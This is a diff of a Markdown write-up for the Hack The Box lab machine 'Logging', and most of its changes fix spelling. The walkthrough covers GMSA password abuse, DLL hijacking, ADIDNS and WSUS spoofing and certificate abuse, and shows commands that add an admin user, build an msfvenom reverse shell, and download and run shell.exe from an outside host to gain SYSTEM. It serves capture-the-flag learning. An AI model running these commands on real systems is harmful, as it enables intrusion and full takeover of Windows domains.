@@ -1,6 +1,7 @@
 <!-- markdownlint-disable MD013 -->
+<!-- markdownlint-disable MD041 -->
 
-![logging.png](logging.png)
+![Logging.png](logging.png)
 
 # Logging
 
@@ -336,7 +337,7 @@ on triggering a DCOM call to a specific Service (like CertSrv for AD CS). If an 
 can compromise a user who is part of this group, they have a "legal" way to talk to the
 DCOM components needed to start the exploit.
 
-2. The "Sceduler" and "Task" Triggers
+2. The "Scheduler" and "Task" Triggers
 Many "Potato" exploits (like JuicyPotatoNG or PrintPotato) rely on triggering a system
 service to authenticate against a fake listener. Performance Log Users have the
 permissions to start/stop certain performance counters and diagnostic logs. These
@@ -350,6 +351,7 @@ because it's a built-in Windows group used for monitoring tools. This makes it a
 "blind spot" for defenders and a "green light" for SilverPotato.
 
 ## Learning About Potatoes
+
 ```txt
 RottenPotato    BITS Service          The original proof of concept using the BITS service.
 JuicyPotato     DCOM / CLSIDs         Expanded the attack to use hundreds of different Windows "objects" to trigger the auth.
@@ -384,7 +386,7 @@ python bloodhound.py \
 
 ## Attacking GMSA (Group Managed Service Accounts)
 
-- [attacking gmsa](https://medium.com/@offsecdeer/attacking-group-managed-service-accounts-gmsa-5e9c54c56e49)
+- [attacking GMSA](https://medium.com/@offsecdeer/attacking-group-managed-service-accounts-gmsa-5e9c54c56e49)
 
 ```bash
 python3 bloodyAD.py ... get search 'DC=logging,DC=htb' '(objectClass=msDS-GroupManagedServiceAccount)'
@@ -417,7 +419,7 @@ cat /etc/krb5.conf
 sudo pacman -S cyrus-sasl-gssapi
 ```
 
-logging in as `svc_recovery`
+Logging in as `svc_recovery`
 
 ```bash
 kinit svc_recovery@LOGGING.HTB
@@ -429,7 +431,7 @@ ldapsearch -H ldap://10.129.39.50:389 \
   -b 'DC=logging,DC=htb'
 ```
 
-**msDS-GroupMSAMembership** is a list users or groups authorized to read the **GMSA** password
+**MsDS-GroupMSAMembership** is a list users or groups authorized to read the **GMSA** password
 stored in the form of a raw binary **Windows Security Descriptor (DACL+SACL)**.
 
 - **DACL**: Discretionary Access Control List
@@ -492,7 +494,7 @@ client = ldap3.Connection(
 )
 ```
 
-Ok so we're **svc_recovery**, we have **GenericWrite** to **msa_health** which is a
+OK, so we're **svc_recovery**, we have **GenericWrite** to **msa_health** which is a
 **GMSA**. So we'll try to overwrite the **msDS-GroupMSAMembership** of **msa_health**
 to make **wallace.everette** a member, which should allow him to read the password
 of the **GMSA**.
@@ -542,7 +544,7 @@ result: 0 Success
 # numReferences: 3
 ```
 
-Ok well. ldapsearch will give us the raw data as it is stored in LDAP,
+OK well. ldapsearch will give us the raw data as it is stored in LDAP,
 and it is a SID in binary form, and base64 encoded. Here's how to decode that into
 its canonical form with impacket.
 
@@ -702,7 +704,7 @@ Maybe we could learn how to fully decode it with impacket? But in any case we ca
 Wallace's SID in there already and what we really care about is the actual
 password itself, it should be under **msDS-ManagedPassword**
 
-BloodyAd gives me an error but there's data here apparently
+BloodyAd gives me an error, but there's data here apparently
 
 ```bash
 bloodyAD -k \
@@ -863,10 +865,10 @@ catch {
 Add-Content -Path $LogPath -Value $Message
 ```
 
-As mentionned in the synopsis we can't use the usual tools to list the services because
+As mentioned in the synopsis we can't use the usual tools to list the services because
 We don't have access
 
-We don't get that info with powershell
+We don't get that info with Powershell
 
 ```powershell
 *Evil-WinRM* PS C:\Share\Logs> Get-ScheduledTask -TaskName "UpdateChecker Agent"
@@ -915,7 +917,7 @@ WorkingDirectory :
 HideAppWindow    : False
 ```
 
-And from here we need to understand what DLLs this thing loads so we can maybe hijack one
+And from here we need to understand what DLLs this thing loads, so we can maybe hijack one
 
 So I pulled UpdateMonotor.exe on my machine and decompiled it with ILSpy, here's the main
 
@@ -1104,7 +1106,6 @@ whoami
 logging\jaylee.clifton
 ```
 
-```
 ```powershell
 powershell -ep bypass
 ```
@@ -1132,7 +1133,7 @@ Invoke-WebRequest `
 rlwrap nc -lvnp 4242
 ```
 
-Yea all that was completely unecessary, but fun anyways.
+Yea all that was completely unnecessary, but fun anyway.
 
 ```txt
 Support Incident View: #4922
@@ -1180,12 +1181,11 @@ iwr -uri http://10.10.16.84:9090/SharpHound.ps1 -OutFile SharpHound.ps1
 Invoke-BloodHound -CollectionMethod All
 ```
 
-
 ## Spoofing WSUS (Windows Server Update Services)
 
 Looking at the new bloodhound scans we have access to a certificate template, that would probably let us
-impersonate the afforementionned wsus server TLS wise. But we also need to gain some kind of man in the middle
-possition, probably by creating a dns record to point the wsus address to our own machine
+impersonate the aforementioned WSUS server TLS wise. But we also need to gain some kind of man in the middle
+position, probably by creating a DNS record to point the WSUS address to our own machine
 
 ### Leverage ADIDNS to Impersonate the WSUS Server
 
@@ -1276,9 +1276,9 @@ Certify v1 works but only support adding SANs as UPN, we want a DNS record SAN
 .\Certify.exe request /ca:DC01.logging.htb\logging-DC01-CA /template:UpdateSrv /altname:wsus.logging.htb
 ```
 
-Apparenlty that's possible with Certify v2, which I can't find a pre-compiled binary for.
-And I really don't have any windows machine to compile this stuff on. So here comes a fun side-quest of spinning
-up a windows machine in Azure, installing visual studio code, and git and so on just to compile
+Apparently that's possible with Certify v2, which I can't find a pre-compiled binary for.
+And I really don't have any Windows machine to compile this stuff on. So here comes a fun side-quest of spinning
+up a Windows machine in Azure, installing Visual Studio Code, and git and so on just to compile
 this thing. Yes Password 123 on the internet, I don't care, I'll destroy it in 30 min
 
 ```powershell
@@ -1350,7 +1350,7 @@ python pywsus.py \
   --command '/accepteula /s cmd.exe /c "net user testuser somepassword /add && net localgroup Administrators testuser /add"'
 ```
 
-Default tries to use a signed psexec and add a new admin user, but it doesn't work 
+Default tries to use a signed psexec and add a new admin user, but it doesn't work
 
 ```bash
 sudo wsuks \
@@ -1374,6 +1374,7 @@ sudo wsuks \
 ```
 
 Make an executable reverse shell
+
 ```bash
 msfvenom \
   -p windows/shell_reverse_tcp \
@@ -1395,10 +1396,18 @@ sudo wsuks \
   -c "/accepteula /s powershell.exe -NoProfile -ep Bypass -Command iwr -Uri 10.10.16.84:9090/shell.exe -OutFile C:\Windows\Tasks\shell.exe; Start-Process C:\Windows\Tasks\shell.exe"
 ```
 
-Voila
+Voilà!
 
 ```powershell
 C:\Windows\system32>whoami
 whoami
 nt authority\system
+```
+
+```bash
+rusthound-ce -d logging.htb -u wallace.everette -p 'Welcom***'
+```
+
+```bash
+cat certipy.json | jq '."Certificate Templates" | to_entries[] | select(all(.value.Permissions."Enrollment Permissions"."Enrollment Rights"[]; test("domain";"i") or test("enterprise";"i") or test("RAS";"i")) | not)'
 ```
